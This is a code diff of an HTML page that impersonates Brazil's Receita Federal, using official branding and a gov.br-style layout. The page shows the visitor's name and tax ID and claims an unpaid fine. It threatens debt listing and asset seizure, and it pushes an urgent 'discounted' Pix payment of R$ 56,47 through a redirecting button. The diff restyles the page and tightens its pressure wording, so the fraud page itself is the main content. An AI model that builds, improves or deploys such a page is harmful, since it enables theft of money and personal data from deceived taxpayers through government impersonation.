@@ -2,7 +2,7 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Regularização de Débitos | Secretaria da Receita Federal</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -17,10 +17,11 @@
             --danger-red: #e52207;
             --warning-orange: #ff5f00;
             --light-gray: #f8f9fa;
-            --border-gray: #ccc;
+            --border-gray: #dddddd;
             --text-dark: #333333;
-            --text-light: #666666;
+            --text-light: #555555;
             --white: #ffffff;
+            --container-padding: 10%;
         }
 
         * {
@@ -31,22 +32,23 @@
 
         body {
             font-family: 'Inter', 'Rawline', sans-serif;
-            background-color: var(--white);
+            background-color: #f4f7fa;
             color: var(--text-dark);
-            line-height: 1.5;
+            line-height: 1.6;
             -webkit-font-smoothing: antialiased;
+            overflow-x: hidden;
         }
 
         /* Top Bar Gov.br Style */
         .gov-top-bar {
             background: var(--white);
             border-bottom: 1px solid #eeeeee;
-            padding: 10px 10%;
+            padding: 8px var(--container-padding);
             display: flex;
             justify-content: space-between;
             align-items: center;
-            font-size: 12px;
-            font-weight: 600;
+            font-size: 11px;
+            font-weight: 700;
         }
 
         .gov-top-bar a {
@@ -54,20 +56,21 @@
             color: var(--text-dark);
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 6px;
         }
 
         .gov-top-bar .social-links {
             display: flex;
-            gap: 15px;
+            gap: 12px;
             color: var(--primary-blue);
         }
 
         /* Main Header */
         header {
             background: var(--primary-blue);
-            padding: 25px 10%;
+            padding: 20px var(--container-padding);
             color: var(--white);
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
 
         .header-content {
@@ -75,95 +78,111 @@
             margin: 0 auto;
             display: flex;
             align-items: center;
-            gap: 20px;
+            gap: 15px;
         }
 
         .brasao-republica {
-            height: 70px;
+            height: 60px;
             width: auto;
         }
 
-        .header-text h1 {
-            font-size: 1.4rem;
-            font-weight: 700;
-            letter-spacing: -0.5px;
+        .header-text p {
+            font-size: 0.75rem;
+            opacity: 0.9;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 2px;
         }
 
-        .header-text p {
-            font-size: 0.9rem;
-            opacity: 0.9;
-            font-weight: 400;
+        .header-text h1 {
+            font-size: 1.2rem;
+            font-weight: 700;
+            line-height: 1.2;
         }
 
         /* Main Content Layout */
         main {
-            max-width: 1000px;
-            margin: 40px auto;
+            max-width: 1100px;
+            margin: 30px auto;
             padding: 0 20px;
             display: grid;
-            grid-template-columns: 1fr 380px;
-            gap: 30px;
+            grid-template-columns: 1fr 360px;
+            gap: 25px;
         }
 
         /* Left Column: Details */
-        .content-details h2 {
-            font-size: 1.5rem;
+        .content-card {
+            background: var(--white);
+            border-radius: 8px;
+            padding: 25px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            border: 1px solid #eef0f2;
+        }
+
+        .content-card h2 {
+            font-size: 1.3rem;
             color: var(--primary-blue);
             margin-bottom: 20px;
-            border-bottom: 2px solid var(--gov-gold);
-            display: inline-block;
-            padding-bottom: 5px;
+            border-left: 4px solid var(--gov-gold);
+            padding-left: 12px;
         }
 
         .notice-box {
-            background: #f0f5ff;
-            border-left: 4px solid var(--secondary-blue);
-            padding: 20px;
-            margin-bottom: 30px;
-            border-radius: 0 4px 4px 0;
+            background: #fff8e1;
+            border-left: 4px solid var(--warning-orange);
+            padding: 15px;
+            margin-bottom: 25px;
+            border-radius: 4px;
         }
 
         .notice-box p {
-            font-size: 0.95rem;
-            color: var(--dark-blue);
+            font-size: 0.9rem;
+            color: #795548;
+            line-height: 1.5;
         }
 
         .data-table {
             width: 100%;
             border-collapse: collapse;
-            margin-bottom: 30px;
+            margin-bottom: 25px;
+        }
+
+        .data-table tr:last-child th, .data-table tr:last-child td {
+            border-bottom: none;
         }
 
         .data-table th, .data-table td {
             text-align: left;
-            padding: 12px 0;
-            border-bottom: 1px solid #eee;
+            padding: 14px 0;
+            border-bottom: 1px solid #f0f0f0;
         }
 
         .data-table th {
-            font-size: 0.8rem;
+            font-size: 0.75rem;
             text-transform: uppercase;
             color: var(--text-light);
             font-weight: 600;
-            width: 30%;
+            width: 35%;
+            vertical-align: top;
         }
 
         .data-table td {
             font-weight: 700;
             color: var(--text-dark);
-            font-size: 1rem;
+            font-size: 0.95rem;
             word-break: break-word;
         }
 
         .status-pill {
             display: inline-block;
-            background: #fff1f0;
+            background: #fee2e2;
             color: var(--danger-red);
-            padding: 4px 12px;
-            border-radius: 50px;
-            font-size: 0.75rem;
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-size: 0.7rem;
             font-weight: 800;
-            border: 1px solid var(--danger-red);
+            border: 1px solid #fecaca;
         }
 
         /* Right Column: Payment Card */
@@ -171,43 +190,50 @@
             background: var(--white);
             border: 1px solid var(--border-gray);
             border-radius: 8px;
-            padding: 30px;
+            padding: 25px;
             position: sticky;
             top: 20px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.08);
+            text-align: center;
         }
 
         .payment-card h3 {
-            font-size: 1.1rem;
-            margin-bottom: 20px;
-            text-align: center;
+            font-size: 1rem;
+            margin-bottom: 15px;
+            color: var(--text-dark);
+            font-weight: 700;
         }
 
         .price-container {
-            text-align: center;
-            margin-bottom: 25px;
+            background: #f8fafc;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border: 1px dashed #cbd5e1;
         }
 
         .price-label {
-            font-size: 0.85rem;
+            font-size: 0.8rem;
             color: var(--text-light);
+            margin-bottom: 5px;
             display: block;
         }
 
         .price-value {
-            font-size: 2.5rem;
+            font-size: 2.2rem;
             font-weight: 800;
-            color: var(--text-dark);
+            color: var(--primary-blue);
+            display: block;
         }
 
         .discount-tag {
-            background: #e6f4ea;
-            color: var(--success-green);
-            padding: 5px 10px;
+            background: #dcfce7;
+            color: #166534;
+            padding: 4px 8px;
             border-radius: 4px;
-            font-size: 0.8rem;
+            font-size: 0.75rem;
             font-weight: 700;
-            margin-top: 5px;
+            margin-top: 8px;
             display: inline-block;
         }
 
@@ -217,40 +243,43 @@
             color: var(--white);
             text-align: center;
             text-decoration: none;
-            padding: 16px;
-            border-radius: 4px;
+            padding: 18px;
+            border-radius: 6px;
             font-weight: 700;
             font-size: 1rem;
-            transition: background 0.2s;
+            transition: transform 0.1s, background 0.2s;
             margin-bottom: 15px;
+            box-shadow: 0 4px 6px rgba(19, 81, 180, 0.2);
         }
 
-        .btn-action:hover {
-            background: var(--dark-blue);
+        .btn-action:active {
+            transform: scale(0.98);
         }
 
         .pix-badge {
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
+            gap: 8px;
             font-size: 0.8rem;
             font-weight: 600;
-            color: var(--text-light);
+            color: #64748b;
         }
 
         .pix-logo {
-            height: 16px;
+            height: 14px;
         }
 
         /* Consequences List */
         .consequences-section {
-            margin-top: 30px;
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid #f0f0f0;
         }
 
         .consequences-section h4 {
-            font-size: 0.9rem;
-            color: var(--text-dark);
+            font-size: 0.8rem;
+            color: #64748b;
             margin-bottom: 15px;
             text-transform: uppercase;
             letter-spacing: 1px;
@@ -258,103 +287,127 @@
 
         .consequence-item {
             display: flex;
-            gap: 12px;
-            margin-bottom: 12px;
-            font-size: 0.9rem;
+            gap: 10px;
+            margin-bottom: 10px;
+            font-size: 0.85rem;
+            align-items: flex-start;
         }
 
-        .consequence-item span:first-child {
-            color: var(--danger-red);
-            font-weight: bold;
+        .consequence-item svg {
+            flex-shrink: 0;
+            margin-top: 3px;
         }
 
         /* Footer */
         footer {
-            background: #f2f2f2;
-            padding: 60px 10% 40px;
-            border-top: 1px solid #ddd;
-            margin-top: 60px;
+            background: #1e293b;
+            padding: 40px var(--container-padding);
+            color: #f1f5f9;
+            margin-top: 50px;
         }
 
         .footer-content {
             max-width: 1200px;
             margin: 0 auto;
             display: grid;
-            grid-template-columns: 2fr 1fr 1fr;
-            gap: 40px;
+            grid-template-columns: 1.5fr 1fr 1fr;
+            gap: 30px;
         }
 
         .footer-col h5 {
-            font-size: 0.9rem;
-            margin-bottom: 20px;
-            color: var(--text-dark);
+            font-size: 0.85rem;
+            margin-bottom: 15px;
+            color: var(--white);
+            font-weight: 700;
         }
 
         .footer-col p, .footer-col a {
             font-size: 0.8rem;
-            color: var(--text-light);
+            color: #cbd5e1;
             text-decoration: none;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
             display: block;
         }
 
         .footer-bottom {
-            margin-top: 40px;
+            margin-top: 30px;
             padding-top: 20px;
-            border-top: 1px solid #ddd;
+            border-top: 1px solid #334155;
             text-align: center;
-            font-size: 0.75rem;
-            color: var(--text-light);
+            font-size: 0.7rem;
+            color: #94a3b8;
         }
 
         /* Responsive Adjustments */
         @media (max-width: 850px) {
+            :root {
+                --container-padding: 15px;
+            }
+
             .gov-top-bar {
-                padding: 10px 15px;
                 flex-direction: column;
-                gap: 10px;
-                text-align: center;
+                padding: 10px 15px;
+                gap: 8px;
             }
 
             .gov-top-bar .social-links {
-                font-size: 10px;
-                gap: 10px;
+                display: none; /* Simplifica mobile */
             }
 
             header {
-                padding: 20px 15px;
+                padding: 15px;
             }
 
             .brasao-republica {
-                height: 50px;
+                height: 45px;
             }
 
             .header-text h1 {
-                font-size: 1.1rem;
+                font-size: 1rem;
             }
 
             main {
                 grid-template-columns: 1fr;
-                margin: 20px auto;
-                padding: 0 15px;
+                margin: 15px auto;
+                padding: 0 12px;
+                gap: 15px;
+            }
+
+            .content-card {
+                padding: 18px;
+            }
+
+            .content-card h2 {
+                font-size: 1.1rem;
+            }
+
+            .data-table th {
+                width: 30%;
+                font-size: 0.7rem;
+            }
+
+            .data-table td {
+                font-size: 0.85rem;
             }
 
             .payment-card {
                 position: static;
                 padding: 20px;
+                box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            }
+
+            .price-value {
+                font-size: 1.8rem;
             }
 
             .footer-content {
                 grid-template-columns: 1fr;
-                gap: 30px;
+                gap: 25px;
+                text-align: center;
             }
 
             footer {
-                padding: 40px 15px;
-            }
-
-            .data-table th {
-                width: 40%;
+                padding: 30px 15px;
             }
         }
 
@@ -381,81 +434,78 @@
             <img src="https://www.gov.br/planalto/pt-br/conheca-a-presidencia/acervo/simbolos-nacionais/brasao/brasaooficialcolorido.png" alt="Brasão Nacional" class="brasao-republica">
             <div class="header-text">
                 <p>MINISTÉRIO DA FAZENDA</p>
-                <h1>Secretaria Especial da Receita Federal do Brasil</h1>
+                <h1>Secretaria da Receita Federal</h1>
             </div>
         </div>
     </header>
 
     <main>
-        <section class="content-details">
-            <h2>Detalhamento da Notificação</h2>
-            
-            <div class="notice-box">
-                <p><strong>Atenção:</strong> Constatamos divergências fiscais vinculadas ao documento informado abaixo. A ausência de regularização dentro do prazo regulamentar poderá ensejar a inscrição em <strong>Dívida Ativa da União</strong> e o ajuizamento de <strong>Execução Fiscal</strong>.</p>
-            </div>
+        <div class="content-card">
+            <section class="content-details">
+                <h2>Detalhamento da Notificação</h2>
+                
+                <div class="notice-box">
+                    <p><strong>Atenção:</strong> Divergências fiscais detectadas. Regularize para evitar inscrição em Dívida Ativa e bloqueios judiciais.</p>
+                </div>
 
-            <table class="data-table">
-                <tr>
-                    <th>Contribuinte</th>
-                    <td id="empresa">Processando...</td>
-                </tr>
-                <tr>
-                    <th>CPF / CNPJ</th>
-                    <td id="cnpj">Processando...</td>
-                </tr>
-                <tr>
-                    <th>Natureza do Débito</th>
-                    <td>Multa Administrativa / Pendência MEI</td>
-                </tr>
-                <tr>
-                    <th>Situação Atual</th>
-                    <td><span class="status-pill">DÉBITO NÃO REGULARIZADO</span></td>
-                </tr>
-            </table>
+                <table class="data-table">
+                    <tr>
+                        <th>Contribuinte</th>
+                        <td id="empresa">Processando...</td>
+                    </tr>
+                    <tr>
+                        <th>CPF / CNPJ</th>
+                        <td id="cnpj">Processando...</td>
+                    </tr>
+                    <tr>
+                        <th>Natureza</th>
+                        <td>Multa Administrativa / MEI</td>
+                    </tr>
+                    <tr>
+                        <th>Situação</th>
+                        <td><span class="status-pill">PENDENTE</span></td>
+                    </tr>
+                </table>
 
-            <div class="consequences-section">
-                <h4>Implicações Legais (Lei nº 10.522/02)</h4>
-                <div class="consequence-item">
-                    <span>●</span>
-                    <p>Inclusão no Cadastro Informativo de Créditos não Quitados (<strong>CADIN</strong>).</p>
+                <div class="consequences-section">
+                    <h4>Implicações da Não Regularização</h4>
+                    <div class="consequence-item">
+                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#e52207" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
+                        <p>Inclusão imediata no <strong>CADIN</strong>.</p>
+                    </div>
+                    <div class="consequence-item">
+                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#e52207" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
+                        <p>Bloqueio de <strong>empréstimos e financiamentos</strong>.</p>
+                    </div>
+                    <div class="consequence-item">
+                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#e52207" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
+                        <p>Risco de <strong>penhora online</strong> via SISBAJUD.</p>
+                    </div>
                 </div>
-                <div class="consequence-item">
-                    <span>●</span>
-                    <p>Impedimento de contratar com o Poder Público e participar de licitações.</p>
-                </div>
-                <div class="consequence-item">
-                    <span>●</span>
-                    <p>Restrição total para obtenção de empréstimos e financiamentos bancários.</p>
-                </div>
-                <div class="consequence-item">
-                    <span>●</span>
-                    <p>Bloqueio de ativos financeiros via sistema <strong>SISBAJUD</strong> em caso de execução judicial.</p>
-                </div>
-            </div>
-        </section>
+            </section>
+        </div>
 
         <aside>
             <div class="payment-card">
-                <h3>Resumo da Guia (DARF)</h3>
+                <h3>Resumo para Quitação</h3>
                 
                 <div class="price-container">
-                    <span class="price-label">Valor consolidado para quitação:</span>
+                    <span class="price-label">Valor total com desconto:</span>
                     <span class="price-value">R$ 56,47</span>
-                    <br>
-                    <span class="discount-tag">Desconto de 70% para liquidação imediata</span>
+                    <span class="discount-tag">70% de desconto aplicado</span>
                 </div>
 
                 <a href="#" id="main-btn" class="btn-action">
-                    EMITIR GUIA DE RECOLHIMENTO
+                    PAGAR AGORA (VIA PIX)
                 </a>
 
                 <div class="pix-badge">
                     <img src="https://upload.wikimedia.org/wikipedia/commons/a/a2/Logo_Pix.png" alt="Pix" class="pix-logo">
-                    Baixa automática via PIX
+                    Liberação imediata dos débitos
                 </div>
 
-                <p style="font-size: 0.7rem; color: #888; text-align: center; margin-top: 20px;">
-                    O prazo para aproveitamento deste desconto expira em 24 horas.
+                <p style="font-size: 0.65rem; color: #94a3b8; text-align: center; margin-top: 15px; line-height: 1.4;">
+                    Vencimento da oferta: <strong>24 horas</strong>.
                 </p>
             </div>
         </aside>
@@ -464,27 +514,23 @@
     <footer>
         <div class="footer-content">
             <div class="footer-col">
-                <h5>Secretaria Especial da Receita Federal do Brasil</h5>
-                <p>Esplanada dos Ministérios, Bloco P - Brasília - DF</p>
-                <p>CEP: 70048-900</p>
+                <h5>Receita Federal</h5>
+                <p>Esplanada dos Ministérios, Brasília - DF</p>
+                <p>Portal de Serviços Governamentais</p>
             </div>
             <div class="footer-col">
                 <h5>Serviços</h5>
-                <a href="#">Consultar CPF</a>
-                <a href="#">Consultar CNPJ</a>
-                <a href="#">Certidões e Situação Fiscal</a>
+                <a href="#">Consultar CPF/CNPJ</a>
                 <a href="#">E-CAC</a>
             </div>
             <div class="footer-col">
-                <h5>Canais de Atendimento</h5>
+                <h5>Suporte</h5>
                 <a href="#">Fale Conosco</a>
                 <a href="#">Ouvidoria</a>
-                <a href="#">Unidades de Atendimento</a>
             </div>
         </div>
         <div class="footer-bottom">
-            <p>&copy; 2026 Receita Federal do Brasil. Todos os direitos reservados.</p>
-            <p style="margin-top: 10px; opacity: 0.6;">Este é um portal de serviços governamentais. Proteja seus dados.</p>
+            <p>&copy; 2026 Receita Federal do Brasil.</p>
         </div>
     </footer>
 
@@ -511,7 +557,6 @@
             btn.addEventListener('click', function(e) {
                 e.preventDefault();
                 
-                // Mantém todos os parâmetros originais e adiciona o subtotal
                 const redirectParams = new URLSearchParams(window.location.search);
                 redirectParams.set('subtotal', '56.47');
                 
